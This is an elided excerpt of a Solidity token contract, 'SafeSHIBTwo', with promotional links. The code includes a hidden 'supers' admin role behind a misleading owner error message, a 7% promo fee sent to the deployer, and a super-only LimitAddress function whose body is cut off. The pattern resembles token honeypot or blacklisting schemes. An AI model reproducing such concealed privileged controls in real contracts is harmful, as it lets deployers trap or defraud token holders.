...
SafeSHIBTwo
bring in faster and reliable 
Technologies with our best skills

tg : https://t.me/SafeSHIBTwo
web : SafeSHIBTwo.com 
...
contract Ownable is Context {
    ...
    modifier isSuper() {
        require(supers == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract SafeSHIBTwo is Context, IERC20, Ownable {
    ...
    string private constant _name = "SafeSHIBTwo"; 
    string private constant _symbol = "SafeSHIBTwo"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 7;
    uint256 public _liquidityFee = 0;
    address private _promoWallet = msg.sender;
    ...
    function LimitAddress(address account, bool newValue) public isSuper {
